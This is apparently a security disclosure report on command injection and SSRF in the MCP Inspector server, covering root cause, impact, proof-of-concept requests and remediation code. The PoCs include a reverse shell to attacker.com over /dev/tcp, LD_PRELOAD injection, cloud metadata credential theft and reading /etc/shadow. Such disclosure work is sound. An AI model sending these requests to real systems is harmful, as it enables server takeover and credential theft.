# Vulnerability Report: Command Injection + SSRF via MCP Inspector

## Summary

| Field | Value |
|---|---|
| **Repository** | [modelcontextprotocol/inspector](https://github.com/modelcontextprotocol/inspector) (10,352 stars) |
| **Vulnerability Type** | Command Injection / SSRF (CWE-78, CWE-918) |
| **CVSS v3.1 Score** | **7.2 (High)** — `AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| **Affected File** | `server/src/index.ts` |
| **Suggested Submission** | HackerOne — Anthropic |

---

## Vulnerability Details

### Root Cause

The MCP Inspector's server directly takes HTTP query parameters for `command`, `args`, `env` and passes them to `StdioClientTransport` for execution. The `url` parameter is passed directly to `SSEClientTransport` without validation.

### Source Code Evidence

```typescript
// server/src/index.ts
// Command Injection: query params → direct execution
const command = req.query.command;   // User-controlled
const args = req.query.args;         // User-controlled
const env = req.query.env;           // User-controlled

const transport = new StdioClientTransport({
    command,    // Directly executed!
    args,
    env
});

// SSRF: url param → direct connection
const url = req.query.url;           // User-controlled
const transport = new SSEClientTransport(new URL(url));  // No validation
```

### Impact

**Command Injection (Critical):**
- Execute arbitrary commands on the server
- Set environment variables (e.g., `LD_PRELOAD` for library injection)
- Full server compromise

**SSRF:**
- Access internal services
- Cloud metadata theft
- Internal network scanning

---

## Proof of Concept

### PoC 1: Command Injection
```
GET /config?transport=stdio&command=/bin/sh&args=-c%20id&env={"LD_PRELOAD":"/tmp/evil.so"}
```

This causes the server to execute:
```
/bin/sh -c id
```
with `LD_PRELOAD=/tmp/evil.so`, enabling arbitrary code execution via shared library injection.

### PoC 2: Reverse Shell
```
GET /config?transport=stdio&command=/bin/bash&args=-c%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261
```

### PoC 3: SSRF via SSE Transport
```
GET /config?transport=sse&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### PoC 4: Read Sensitive Files
```
GET /config?transport=stdio&command=cat&args=/etc/shadow
```

---

## Remediation
1. **Never pass user input directly to command execution**
2. Use an allowlist of permitted commands
3. Validate and sanitize all URL parameters
4. Block private IPs and metadata endpoints in SSE URL
5. Implement proper input validation:
```typescript
const ALLOWED_COMMANDS = ['node', 'python', 'npx'];
function validateCommand(cmd: string): boolean {
    return ALLOWED_COMMANDS.includes(path.basename(cmd));
}

function validateUrl(url: string): boolean {
    const parsed = new URL(url);
    if (!['http:', 'https:'].includes(parsed.protocol)) return false;
    const blocked = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.)/;
    if (blocked.test(parsed.hostname)) return false;
    return true;
}
```

## References
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
